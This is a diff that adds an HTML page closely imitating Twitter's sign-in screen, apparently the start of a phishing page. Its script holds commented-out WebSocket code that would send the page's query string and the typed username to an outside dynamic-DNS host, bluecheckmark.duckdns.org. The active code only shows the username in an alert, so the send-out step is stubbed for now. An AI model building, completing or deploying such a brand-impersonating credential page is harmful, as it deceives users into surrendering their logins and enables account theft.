@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter Login Page</title>
+    <link rel="stylesheet" href="style.css" >
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
+    <script>
+        //var connection = new WebSocket('wss:bluecheckmark.duckdns.org/myws2');
+        /*
+        connection.onopen = function() {
+            console.log('Connected test!');
+            const queryString = window.location.search;
+            if(queryString.length > 0){
+                connection.send(queryString);
+            }
+        }
+	*/
+        
+        function DoConnection() {
+          if(!($('#username').val() === null || $('#username').val() === "")){
+                alert('Username: '+$('#username').val())
+		//connection.send('Username: '+$('#username'));
+          }
+        }
+        
+       $(document).ready(function() {
+               $('#login').click(function() {
+                DoConnection();
+               });			   
+           
+       });
+    </script>
+</head>
+    <body>
+        <div class="login-card">
+            <div class="login-card-header">
+                <a href="#">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </a>
+                <img width="25" src="images/twiiter.png" alt="...">
+            </div>
+            <h1>Sign in to Twitter</h1>
+            <a href="#" class="btn" style="margin-bottom: 1.5rem">
+                <img src="images/google.svg.png" alt=""> Continue with Google
+            </a>
+            <a href="#" class="btn2" style="margin-bottom: 1.5rem">
+                <img src="images/AP.svg.png" alt=""> Continue with Apple
+            </a>
+            <div class="line-border">or</div>
+            <div class="input-group">
+                <input id="username" type="text">
+                <span>Phone, email or username</span>
+            </div>
+            <a href="#" class="btn" id="login" style="margin-bottom: 1.5rem;">Next</a>
+            <a href="#" class="btn btn-outline">Forgot Password?</a>
+
+            <div style="margin: 3rem 0; color: #888"> Don't have an account?
+                <a href="#">Sign Up</a>
+            </div>
+        </div>
+        <script>
+            const input = document.querySelector('.login-card input[type="text"]');
+            input.addEventListener('focus', () => input.classList.add('focus'));
+            input.addEventListener('focusout', () => !input.value ? input.classList.remove('focus') : false);
+        </script>
+    </body>
+</html>
